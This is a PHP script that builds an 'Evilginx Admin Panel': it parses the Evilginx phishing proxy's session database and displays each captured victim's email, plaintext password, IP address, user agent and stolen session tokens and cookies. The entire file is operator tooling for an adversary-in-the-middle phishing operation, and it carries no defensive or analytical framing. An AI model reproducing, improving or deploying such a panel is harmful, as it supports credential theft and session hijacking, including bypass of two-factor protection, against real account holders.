<?php

// Path to evilginx data file
$DB_FILE = "/root/.evilginx/data.db";

// Read whole file
$content = file_get_contents($DB_FILE);
$lines = explode("\n", $content);

$sessions = [];
$total = count($lines);

for ($i = 0; $i < $total; $i++) {

    // Detect session header
    if (preg_match('/^sessions:(\d+)/', trim($lines[$i]), $m)) {

        $session_id = $m[1];

        // move to next line containing JSON length
        $json_len_line = trim($lines[$i + 1]);

        // move to next line containing JSON data
        $json_line = trim($lines[$i + 2]);

        // Make sure JSON line starts with `{`
        if (strpos($json_line, "{") === 0) {
            $data = json_decode($json_line, true);

            if ($data) {
                $sessions[$session_id] = $data;
            }
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Evilginx Admin</title>
    <style>
        body { background:#111; color:#eee; font-family:Arial; padding:20px; }
        .session-box {
            background:#222;
            padding:15px;
            margin-bottom:15px;
            border-radius:5px;
        }
        .cookie-box {
            background:#000;
            padding:10px;
            margin-top:10px;
            white-space:pre-wrap;
            color:#0f0;
            display:none;
        }
        button {
            background:#444;
            color:#fff;
            padding:8px 14px;
            border:none;
            cursor:pointer;
            border-radius:4px;
        }
        button:hover { background:#666; }
    </style>

    <script>
        function toggleCookies(id) {
            var box = document.getElementById("cookie_" + id);
            box.style.display = (box.style.display === "none") ? "block" : "none";
        }
    </script>
</head>

<body>

<h1>Evilginx Admin Panel</h1>

<?php
if (empty($sessions)) {
    echo "<p>No sessions found.</p>";
    exit;
}

foreach ($sessions as $sid => $s) {

    $ip = $s["remote_addr"] ?? "N/A";
    $ua = $s["useragent"] ?? "N/A";
    $email = $s["username"] ?? "";
    $pass = $s["password"] ?? "";
    $cookie = json_encode($s["tokens"] ?? [], JSON_PRETTY_PRINT);
    $time = $s["update_time"] ?? "N/A";

    echo "<div class='session-box'>";
    echo "<h3>Session: $sid</h3>";
    echo "<b>Email:</b> $email<br>";
    echo "<b>Password:</b> $pass<br>";
    echo "<b>IP:</b> $ip<br>";
    echo "<b>UA:</b> $ua<br>";
    echo "<b>Time:</b> $time<br><br>";

    echo "<button onclick=\"toggleCookies('$sid')\">View Cookies</button>";

    echo "<div class='cookie-box' id='cookie_$sid'>$cookie</div>";

    echo "</div>";
}
?>

</body>
</html>